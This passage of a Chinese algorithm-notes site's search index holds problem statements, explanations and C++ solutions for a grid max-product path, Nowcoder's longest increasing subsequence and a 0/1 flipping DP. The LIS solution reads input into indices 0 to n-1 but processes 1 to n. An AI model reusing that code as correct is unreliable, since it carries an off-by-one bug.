\u5b58\u50a8\u6700\u5927\u6700\u5c0f\u503c\u548c\u5f53\u524d\u65b9\u5757\u503c\u7684\u79ef\uff0c\u56e0\u4e3a\u8d1f\u53f7\u7684\u5b58\u5728\uff0c\u5927\u5c0f\u53ef\u80fd\u7ffb\u8f6c maxBuffer = grid[i][j] * max(dpMax[i - 1][j], dpMax[i][j - 1]); minBuffer = grid[i][j] * min(dpMin[i - 1][j], dpMin[i][j - 1]); // \u518d\u5224\u65ad\u4e00\u6b21\u5927\u5c0f dpMax[i][j] = max(maxBuffer, minBuffer); dpMin[i][j] = min(maxBuffer, minBuffer); } } long long ans = dpMax[grid.size() - 1][grid[0].size() - 1] % MOD; return ans >= 0 ? ans : -1; } }; \u7528 DFS + \u526a\u679d \u8fd9\u9898\u4e5f\u80fd\u901a\u8fc7\uff0c\u4e0d\u8fc7\u65f6\u95f4\u5df2\u7ecf\u5230 1900ms \u4e86\uff0c\u5982\u679c\u6709\u66f4\u590d\u6742\u4e00\u4e9b\u7684\u6d4b\u8bd5\u7528\u4f8b\u4f30\u8ba1\u5c31\u8d85\u65f6\u4e86\u3002 class Solution { public: const int mod = 1e9 + 7; long long ans = -1; void DFS(vector<vector<int>>& grid, size_t x, size_t y, long long buffer) { // \u4e58\u79ef buffer *= grid[x][y]; // \u505c\u6b62\u641c\u7d22\u6761\u4ef6 if (y == grid[0].size() - 1 && x == grid.size() - 1) { ans = max(ans, buffer); // \u4e0d\u80fd\u4f7f\u7528\u4e0b\u9762\u7684\u4ee3\u7801\u5728\u8fd9\u91cc\u53d6\u6a21\uff0c\u56e0\u4e3a\u4f1a\u5c06ans\u7684\u5927\u5c0f\u524a\u51cf\uff0c\u4ece\u800c\u4f7f\u539f\u672c\u66f4\u5c0f\u7684buffer\u66f4\u65b0ans // ans = max(ans, buffer) % mod; return; } // \u7ee7\u7eed\u641c\u7d22\u6761\u4ef6 if (buffer == 0) { ans = max(ans, 0LL); } else { // \u5411\u884c\u65b9\u5411\u6269\u5c55 if (x < grid.size() - 1) { DFS(grid, x + 1, y, buffer); } // \u5411\u5217\u65b9\u5411\u6269\u5c55 if (y < grid[0].size() - 1) { DFS(grid, x, y + 1, buffer); } } } int maxProductPath(vector<vector<int>>& grid) { DFS(grid, 0, 0, 1); ans %= mod; return ans >= 0 ? ans : -1; } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC26156_%E6%9C%80%E9%95%BF%E9%80%92%E5%A2%9E%E9%95%BF%E5%BA%A6/","text":"\u725b\u5ba2\u7f51 NC26156 G. \u6700\u957f\u9012\u589e\u957f\u5ea6 # \u76ee\u5f55 # \u725b\u5ba2\u7f51 NC26156 G. \u6700\u957f\u9012\u589e\u957f\u5ea6 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 Memory Limit: C/C++ 32768K\uff0c\u5176\u4ed6\u8bed\u8a0065536K 1.2. Problem Description # \u7ed9\u5b9a\u4e00\u4e2a\u957f\u5ea6\u4e3a n \u7684\u6574\u6570\u5e8f\u5217 S \uff0c\u6c42\u8fd9\u4e2a\u5e8f\u5217\u4e2d\u6700\u957f\u7684\u4e25\u683c\u9012\u589e\u5b50\u5e8f\u5217\u7684\u957f\u5ea6\u3002 1.3. Input # \u7b2c\u4e00\u884c\uff0c\u4e00\u4e2a\u6574\u6570 n (2 \\le n \\le 50000) \uff0c\u8868\u793a\u5e8f\u5217\u7684\u957f\u5ea6 \u7b2c\u4e8c\u884c\uff0c\u6709 n \u4e2a\u6574\u6570 (-10^9 \\le S[i] \\le 10^9) \uff0c\u8868\u793a\u8fd9\u4e2a\u5e8f\u5217 1.4. Output # \u8f93\u51fa\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u6700\u957f\u9012\u589e\u5b50\u5e8f\u5217\u7684\u957f\u5ea6 1.5. Sample Input # 6 4 0 5 8 7 8 1.6. Sample Output # 4 1.7. Note # \u6837\u4f8b\u89e3\u91ca \u5b50\u5e8f\u5217\u4e3a 0 5 7 8 1.8. Source # \u725b\u5ba2\u7f51 NC26156 G. \u6700\u957f\u9012\u589e\u957f\u5ea6 2. \u89e3\u8bfb # \u9898\u610f \uff1a\u6c42\u6700\u957f\u9012\u589e\u5b50\u5e8f\u5217\u7684\u957f\u5ea6\u3002\u7528 O(n^2) \u7684 DP \u8bd5\u4e86\u4e00\u4e0b\u8d85\u65f6\u4e86\uff0c\u6240\u4ee5\u8fd9\u9898\u53ef\u80fd\u9700\u8981\u4f7f\u7528 O(n \\log n) \u7684\u7b97\u6cd5\u3002 \u9898\u89e3 \uff1a\u5b9a\u4e49\u4e00\u4e2a\u6570\u7ec4 d[] \u5b58\u50a8\u6700\u957f\u9012\u589e\u5b50\u5e8f\u5217 \uff0c len \u7edf\u8ba1 d[] \u5185\u6570\u636e\u7684\u4e2a\u6570\uff0c list[] \u5b58\u50a8\u539f\u59cb\u5e8f\u5217\u3002\u521d\u59cb\u5316 d[1] = list[1] \uff0c len = 1 \u3002\u6839\u636e\u4e0b\u9762\u7684\u64cd\u4f5c\u6b65\u9aa4\u8fdb\u884c\u64cd\u4f5c\u3002 \u64cd\u4f5c\u6b65\u9aa4 \uff1a\u9010\u4e2a\u5904\u7406 list[] \u4e2d\u7684\u6570\u5b57\uff0c\u4f8b\u5982\u5904\u7406\u5230\u4e86 list[k] \uff0c\u8fdb\u884c\u5224\u65ad \u5982\u679c list[k] \u6bd4 d[] \u672b\u5c3e\u7684\u6570\u5b57\u66f4\u5927\uff0c\u5c31\u52a0\u5230 d[] \u7684\u540e\u9762\u3002 \u5982\u679c list[k] \u6bd4 d[] \u672b\u5c3e\u7684\u6570\u5b57\u66f4\u5c0f\uff0c\u5c31\u66ff\u6362 d[] \u4e2d\u7b2c 1 \u4e2a\u5927\u4e8e\u5b83\u7684\u6570\u5b57\u3002 \u4ee5 list[] = {4, 8, 9, 5, 6, 7} \u4e3a\u4f8b\uff0c\u5177\u4f53\u7684\u64cd\u4f5c\u8fc7\u7a0b\u5982\u4e0b\u8868\u6240\u793a\u3002 i list[] d[] len \u8bf4\u660e 1 4 , 8, 9, 5, 6, 7 4 1 \u521d\u59cb\u503c d[1] = list[1] 2 4, 8 , 9, 5, 6, 7 4, 8 2 list[2] > d[1] \uff0c\u52a0\u5230 d[] \u7684\u540e\u9762 3 4, 8, 9 , 5, 6, 7 4, 8, 9 3 d[] \u540e\u9762\u52a0\u4e0a 9 4 4, 8, 9, 5 , 6, 7 4, 5 , 9 3 5 \u6bd4 d[] \u672b\u5c3e\u7684 9 \u5c0f\uff0c\u7528 5 \u66ff\u6362 d[] \u4e2d\u7b2c 1 \u4e2a\u6bd4 5 \u5927\u7684\u6570\u5b578 5 4, 8, 9, 5, 6 , 7 4, 5, 6 3 \u7528 6 \u66ff\u6362 9 6 4, 8, 9, 5, 6, 7 4, 5, 6, 7 4 d[] \u540e\u9762\u52a0\u4e0a 7 3. \u4ee3\u7801 # #include<iostream> using namespace std; const int NUM = 5e4 + 1; long long n, list[NUM]; int LIS() { long long len = 1; long long d[NUM]; // \u521d\u59cb\u5316 d[1] = list[1]; // O(n) for (int i = 2; i <= n; i++) { // \u7b26\u5408\u9012\u589e\u7684\u8981\u6c42\uff0c\u52a0\u5165 if (list[i] > d[len]) { d[++len] = list[i]; } else { // \u66ff\u6362\uff0cO(logn) long long j = lower_bound(d + 1, d + len + 1, list[i]) - d; d[j] = list[i]; } } return len; } int main(){ cin >> n; for(int i = 0; i< n;i++){ cin >> list[i]; } cout << LIS() << endl; } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"9.\u725b\u5ba2\u7f51 NC26156 \u6700\u957f\u9012\u589e\u957f\u5ea6"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC26156_%E6%9C%80%E9%95%BF%E9%80%92%E5%A2%9E%E9%95%BF%E5%BA%A6/#nc26156-g","text":"","title":"\u725b\u5ba2\u7f51 NC26156 G. \u6700\u957f\u9012\u589e\u957f\u5ea6"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC26156_%E6%9C%80%E9%95%BF%E9%80%92%E5%A2%9E%E9%95%BF%E5%BA%A6/#_1","text":"\u725b\u5ba2\u7f51 NC26156 G. \u6700\u957f\u9012\u589e\u957f\u5ea6 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC26156_%E6%9C%80%E9%95%BF%E9%80%92%E5%A2%9E%E9%95%BF%E5%BA%A6/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC26156_%E6%9C%80%E9%95%BF%E9%80%92%E5%A2%9E%E9%95%BF%E5%BA%A6/#11-limit","text":"Time Limit: C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 Memory Limit: C/C++ 32768K\uff0c\u5176\u4ed6\u8bed\u8a0065536K","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC26156_%E6%9C%80%E9%95%BF%E9%80%92%E5%A2%9E%E9%95%BF%E5%BA%A6/#12-problem-description","text":"\u7ed9\u5b9a\u4e00\u4e2a\u957f\u5ea6\u4e3a n \u7684\u6574\u6570\u5e8f\u5217 S \uff0c\u6c42\u8fd9\u4e2a\u5e8f\u5217\u4e2d\u6700\u957f\u7684\u4e25\u683c\u9012\u589e\u5b50\u5e8f\u5217\u7684\u957f\u5ea6\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC26156_%E6%9C%80%E9%95%BF%E9%80%92%E5%A2%9E%E9%95%BF%E5%BA%A6/#13-input","text":"\u7b2c\u4e00\u884c\uff0c\u4e00\u4e2a\u6574\u6570 n (2 \\le n \\le 50000) \uff0c\u8868\u793a\u5e8f\u5217\u7684\u957f\u5ea6 \u7b2c\u4e8c\u884c\uff0c\u6709 n \u4e2a\u6574\u6570 (-10^9 \\le S[i] \\le 10^9) \uff0c\u8868\u793a\u8fd9\u4e2a\u5e8f\u5217","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC26156_%E6%9C%80%E9%95%BF%E9%80%92%E5%A2%9E%E9%95%BF%E5%BA%A6/#14-output","text":"\u8f93\u51fa\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u6700\u957f\u9012\u589e\u5b50\u5e8f\u5217\u7684\u957f\u5ea6","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC26156_%E6%9C%80%E9%95%BF%E9%80%92%E5%A2%9E%E9%95%BF%E5%BA%A6/#15-sample-input","text":"6 4 0 5 8 7 8","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC26156_%E6%9C%80%E9%95%BF%E9%80%92%E5%A2%9E%E9%95%BF%E5%BA%A6/#16-sample-output","text":"4","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC26156_%E6%9C%80%E9%95%BF%E9%80%92%E5%A2%9E%E9%95%BF%E5%BA%A6/#17-note","text":"\u6837\u4f8b\u89e3\u91ca \u5b50\u5e8f\u5217\u4e3a 0 5 7 8","title":"1.7. Note"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC26156_%E6%9C%80%E9%95%BF%E9%80%92%E5%A2%9E%E9%95%BF%E5%BA%A6/#18-source","text":"\u725b\u5ba2\u7f51 NC26156 G. \u6700\u957f\u9012\u589e\u957f\u5ea6","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC26156_%E6%9C%80%E9%95%BF%E9%80%92%E5%A2%9E%E9%95%BF%E5%BA%A6/#2","text":"\u9898\u610f \uff1a\u6c42\u6700\u957f\u9012\u589e\u5b50\u5e8f\u5217\u7684\u957f\u5ea6\u3002\u7528 O(n^2) \u7684 DP \u8bd5\u4e86\u4e00\u4e0b\u8d85\u65f6\u4e86\uff0c\u6240\u4ee5\u8fd9\u9898\u53ef\u80fd\u9700\u8981\u4f7f\u7528 O(n \\log n) \u7684\u7b97\u6cd5\u3002 \u9898\u89e3 \uff1a\u5b9a\u4e49\u4e00\u4e2a\u6570\u7ec4 d[] \u5b58\u50a8\u6700\u957f\u9012\u589e\u5b50\u5e8f\u5217 \uff0c len \u7edf\u8ba1 d[] \u5185\u6570\u636e\u7684\u4e2a\u6570\uff0c list[] \u5b58\u50a8\u539f\u59cb\u5e8f\u5217\u3002\u521d\u59cb\u5316 d[1] = list[1] \uff0c len = 1 \u3002\u6839\u636e\u4e0b\u9762\u7684\u64cd\u4f5c\u6b65\u9aa4\u8fdb\u884c\u64cd\u4f5c\u3002 \u64cd\u4f5c\u6b65\u9aa4 \uff1a\u9010\u4e2a\u5904\u7406 list[] \u4e2d\u7684\u6570\u5b57\uff0c\u4f8b\u5982\u5904\u7406\u5230\u4e86 list[k] \uff0c\u8fdb\u884c\u5224\u65ad \u5982\u679c list[k] \u6bd4 d[] \u672b\u5c3e\u7684\u6570\u5b57\u66f4\u5927\uff0c\u5c31\u52a0\u5230 d[] \u7684\u540e\u9762\u3002 \u5982\u679c list[k] \u6bd4 d[] \u672b\u5c3e\u7684\u6570\u5b57\u66f4\u5c0f\uff0c\u5c31\u66ff\u6362 d[] \u4e2d\u7b2c 1 \u4e2a\u5927\u4e8e\u5b83\u7684\u6570\u5b57\u3002 \u4ee5 list[] = {4, 8, 9, 5, 6, 7} \u4e3a\u4f8b\uff0c\u5177\u4f53\u7684\u64cd\u4f5c\u8fc7\u7a0b\u5982\u4e0b\u8868\u6240\u793a\u3002 i list[] d[] len \u8bf4\u660e 1 4 , 8, 9, 5, 6, 7 4 1 \u521d\u59cb\u503c d[1] = list[1] 2 4, 8 , 9, 5, 6, 7 4, 8 2 list[2] > d[1] \uff0c\u52a0\u5230 d[] \u7684\u540e\u9762 3 4, 8, 9 , 5, 6, 7 4, 8, 9 3 d[] \u540e\u9762\u52a0\u4e0a 9 4 4, 8, 9, 5 , 6, 7 4, 5 , 9 3 5 \u6bd4 d[] \u672b\u5c3e\u7684 9 \u5c0f\uff0c\u7528 5 \u66ff\u6362 d[] \u4e2d\u7b2c 1 \u4e2a\u6bd4 5 \u5927\u7684\u6570\u5b578 5 4, 8, 9, 5, 6 , 7 4, 5, 6 3 \u7528 6 \u66ff\u6362 9 6 4, 8, 9, 5, 6, 7 4, 5, 6, 7 4 d[] \u540e\u9762\u52a0\u4e0a 7","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/9.%E7%89%9B%E5%AE%A2%E7%BD%91_NC26156_%E6%9C%80%E9%95%BF%E9%80%92%E5%A2%9E%E9%95%BF%E5%BA%A6/#3","text":"#include<iostream> using namespace std; const int NUM = 5e4 + 1; long long n, list[NUM]; int LIS() { long long len = 1; long long d[NUM]; // \u521d\u59cb\u5316 d[1] = list[1]; // O(n) for (int i = 2; i <= n; i++) { // \u7b26\u5408\u9012\u589e\u7684\u8981\u6c42\uff0c\u52a0\u5165 if (list[i] > d[len]) { d[++len] = list[i]; } else { // \u66ff\u6362\uff0cO(logn) long long j = lower_bound(d + 1, d + len + 1, list[i]) - d; d[j] = list[i]; } } return len; } int main(){ cin >> n; for(int i = 0; i< n;i++){ cin >> list[i]; } cout << LIS() << endl; } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205087_%E7%89%9B%E5%A6%B9%E7%88%B1%E6%95%B0%E5%88%97/","text":"\u725b\u5ba2\u7f51 NC205087 \u725b\u59b9\u7231\u6570\u5217 # \u76ee\u5f55 # \u725b\u5ba2\u7f51 NC205087 \u725b\u59b9\u7231\u6570\u5217 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Title 1.2. Time Limit 1.3. Memory Limit 1.4. Problem Description 1.5. Input 1.6. Output 1.7. Sample Input 1.8. Sample Output 1.9. Note 1.10. Source 2. \u9898\u89e3 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Title # \u725b\u5ba2\u7f51 NC205087 \u725b\u59b9\u7231\u6570\u5217 1.2. Time Limit # C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 1.3. Memory Limit # C/C++ 262144K\uff0c\u5176\u4ed6\u8bed\u8a00524288K 1.4. Problem Description # \u725b\u59b9\u6b63\u5728\u73a9\u4e00\u4e2a\u6570\u5217\u4ed6\u624b\u91cc\u6709\u4e00\u4e2a\u957f\u5ea6\u4e3an\u7684\u5e8f\u5217a\uff0c\u4fdd\u8bc1\u5b83\u662f\u4e00\u4e2a01\u5e8f\u5217\uff0c\u5e76\u6267\u884c\u4ee5\u4e0b\u4e24\u79cd\u64cd\u4f5c\uff1a \u5355\u70b9\u4fee\u6539\uff1a\u5c06\u4f4d\u7f6ex\u4e0a\u7684\u6570\u7ffb\u8f6c\uff080\u53d81,1\u53d80\uff09 \u524d\u7f00\u4fee\u6539\uff1a\u5c06\u4f4d\u7f6e1~x\u4e0a\u7684\u6570\u7ffb\u8f6c\uff08\u6bcf\u4e2a\u6570\u90fd0\u53d81,1\u53d80\uff09\u3002\u4ed6\u73b0\u5728\u60f3\u8981\u6700\u5c0f\u5316\u7ffb\u8f6c\u6b21\u6570\uff0c\u4f7f\u5f97\u6570\u5217\u4e0a\u7684\u6240\u6709\u6570\u90fd\u53d8\u4e3a0\u3002 1.5. Input # \u7b2c\u4e00\u884c\uff0c\u8f93\u5165\u4e00\u4e2a\u6570 n \u3002\u7b2c\u4e8c\u884c\uff0c\u8f93\u5165 n \u4e2a\u6570\uff0c\u7b2c i \u4e2a\u6570\u8868\u793a a_i \u3002 1.6. Output # \u8f93\u51fa\u6700\u5c0f\u7ffb\u8f6c\u6b21\u6570\u3002 1.7. Sample Input # 10 1 0 1 1 0 0 0 1 0 0 1.8. Sample Output # 3 1.9. Note # \u6570\u636e\u4fdd\u8bc1 1\\le n\\le 10^5,0\\le a_i\\le 1 \u3002 1.10. Source # \u725b\u5ba2\u7f51 NC205087 \u725b\u59b9\u7231\u6570\u5217 2. \u9898\u89e3 # \u9898\u89e3\u6765\u81ea \u51fa\u9898\u4eba\u7684\u725b\u5ba2\u535a\u5ba2 \u3002 \u8003\u8651\u52a8\u6001\u89c4\u5212\u3002 \u6211\u4eec\u5b9a\u4e49 dp[i][0/1] \u8868\u793a\u5f53\u524d\u7b2c i \u4e2a\u4f4d\u7f6e\uff0c\u5c06\u524d i \u4e2a\u4f4d\u7f6e\u5168\u53d8\u6210 0/1 \u7684\u6700\u5c11\u64cd\u4f5c\u6570\u3002 \u5982\u679c\u5f53\u524d\u4f4d\u7f6e\u4e0a a[i]=1 \uff0c\u5219\uff1a dp[i][0]=min(dp[i-1][0]+1,dp[i-1][1]+1) \uff0c\u6211\u4eec\u53ef\u4ee5\u5c06 a[i] \u5355\u72ec\u7ffb\u8f6c\uff0c\u4e5f\u53ef\u4ee5\u5c06\u8fd9\u524d\u7f00 1 \u4e00\u8d77\u7ffb\u8f6c\uff1b dp[i][1]=min(dp[i-1][1],dp[i-1][0]+1) \uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u524d\u7f00 0 \u7ffb\u8f6c\uff0c\u7136\u540e\u628a a[i] \u62fc\u4e0a\u53bb\u3002 \u5982\u679c\u5f53\u524d\u4f4d\u7f6e\u4e0a a[i]=0 \uff0c\u5219\uff1a dp[i][0]=min(dp[i-1][0],dp[i-1][1]+1) \uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u524d\u7f00 1 \u7ffb\u8f6c\uff0c\u7136\u540e\u628a a[i] \u62fc\u4e0a\u53bb\uff1b dp[i][1]=min(dp[i-1][0]+1,dp[i-1][1]+1) \uff0c\u6211\u4eec\u53ef\u4ee5\u5c06 a[i] \u5355\u72ec\u7ffb\u8f6c\uff0c\u4e5f\u53ef\u4ee5\u5c06\u8fd9\u524d\u7f00 0 \u4e00\u8d77\u7ffb\u8f6c\uff1b \u7b54\u6848\u8bb0\u4e3a min(dp[n][0],dp[n][1]) \u3002 \u65f6\u95f4\u590d\u6742\u5ea6\uff1a O(n) \u3002 3. \u4ee3\u7801 # #include <iostream> using namespace std; const int N = 100005; int a[N], dp[N][2] = {0}, n; int main() { cin >> n; for (int i = 1; i <= n; i++) { cin >> a[i]; } for (int i = 1; i <= n; i++) { if (a[i] == 1) { dp[i][0] = min(dp[i - 1][0] + 1, dp[i - 1][1] + 1); dp[i][1] = min(dp[i - 1][1], dp[i - 1][0] + 1); } else { dp[i][0] = min(dp[i - 1][0], dp[i - 1][1] + 1); dp[i][1] = min(dp[i - 1][0] + 1, dp[i - 1][1] + 1); } } printf(\"%d\\n\", dp[n][0]); return 0; } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.\u725b\u5ba2\u7f51 NC205087 \u725b\u59b9\u7231\u6570\u5217"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205087_%E7%89%9B%E5%A6%B9%E7%88%B1%E6%95%B0%E5%88%97/#nc205087","text":"","title":"\u725b\u5ba2\u7f51 NC205087 \u725b\u59b9\u7231\u6570\u5217"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205087_%E7%89%9B%E5%A6%B9%E7%88%B1%E6%95%B0%E5%88%97/#_1","text":"\u725b\u5ba2\u7f51 NC205087 \u725b\u59b9\u7231\u6570\u5217 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Title 1.2. Time Limit 1.3. Memory Limit 1.4. Problem Description 1.5. Input 1.6. Output 1.7. Sample Input 1.8. Sample Output 1.9. Note 1.10. Source 2. \u9898\u89e3 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205087_%E7%89%9B%E5%A6%B9%E7%88%B1%E6%95%B0%E5%88%97/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205087_%E7%89%9B%E5%A6%B9%E7%88%B1%E6%95%B0%E5%88%97/#11-title","text":"\u725b\u5ba2\u7f51 NC205087 \u725b\u59b9\u7231\u6570\u5217","title":"1.1. Title"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205087_%E7%89%9B%E5%A6%B9%E7%88%B1%E6%95%B0%E5%88%97/#12-time-limit","text":"C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2","title":"1.2. Time 